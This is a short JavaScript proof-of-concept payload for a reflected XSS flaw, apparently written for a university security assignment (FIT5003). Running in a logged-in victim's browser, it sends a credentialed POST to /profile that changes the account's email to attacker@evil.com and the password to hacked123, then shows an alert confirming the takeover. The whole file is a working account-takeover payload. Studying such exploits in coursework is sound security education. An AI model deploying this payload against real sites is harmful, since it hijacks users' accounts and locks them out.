// B.2 reflected XSS payload — account takeover PoC (FIT5003 A2)
// Runs in the logged-in victim's browser via the reflected sink.
// Uses the victim's own session to change their account email + password.
fetch('/profile', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=attacker@evil.com&password=hacked123'
}).then(function () {
  // optional visible proof the payload ran
  alert('Account taken over: email+password changed');
});
